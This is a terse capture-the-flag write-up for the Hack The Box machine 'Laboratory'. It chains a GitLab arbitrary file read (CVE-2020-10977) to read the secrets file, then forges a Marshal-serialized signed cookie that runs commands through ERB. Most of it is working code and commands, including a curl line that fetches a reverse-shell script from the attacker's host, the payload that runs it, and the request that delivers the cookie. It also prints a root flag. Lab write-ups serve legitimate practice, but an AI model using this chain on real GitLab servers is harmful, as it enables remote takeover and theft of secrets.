# Laboratory
```
EXPORT_IP = 10.10.10.216
```
#### SCAN 
- Reference : nmap/initial

#### Reconnissance
- [x] INRESTING 
  - ssl-cert: Subject: commonName=laboratory.htb
  - Subject Alternative Name: DNS:git.laboratory.htb

#### gitlab Enumeration
```
1. Gitlab Sign in -> (username:me , password:12345678)

2. cve_2020_10977.py (Arbitary File Read)
 - Usage
   - python3 cve_2020_10977.py http://git.laboratory.htb/user/sign_in username password

```
- Reference : https://hackerone.com/reports/827052
 - GITLAB_SECRET_FILE : /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml 


#### gitlab ENV
```
1. gitlab build local Enviorment Build 
2. Google Search
```

> Local GitLab Cookie
> Exec-Command : `curl 10.10.14.106:8000/revShell.sh -o /tmp/revShell.sh`
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= {Exec-Command} %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr

puts cookies[:cookie]
```
- COPY & PASTE Cookie Field : [COOKIE-COPY]


#### Gaining Access Payload
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash /tmp/revShell.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
> GAINING PAYLOAD
>> curl -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=[COOKIE-COPY-PASTE]5" -k


#### USER ESCALATE 
```

```

#### ROOT ESCALATE
```
root_flag : 328f9b5f2526a38bd9440e03d24fee9c
```

#### Reference 
 - ytb user flag : https://www.youtube.com/watch?v=ns7Xl4t8sxQ
 - ytb root flag : https://www.youtube.com/watch?v=67RvQNTiXE0